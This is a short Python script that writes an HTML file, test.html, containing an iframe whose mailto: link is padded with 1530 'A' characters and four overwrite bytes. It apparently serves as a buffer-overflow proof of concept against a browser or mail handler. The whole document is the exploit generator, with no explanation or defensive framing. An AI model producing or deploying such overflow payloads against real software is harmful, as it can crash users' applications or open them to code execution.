#!/usr/bin/python

a = "<iframe src='mailto:"
a += "A" * 1530
a += "\x61\x61\x61\x61"
a += "' width='320' height='300' scrolling='yes' name='content'></iframe>"

file = open("test.html", "w")
file.write(a)
file.close()
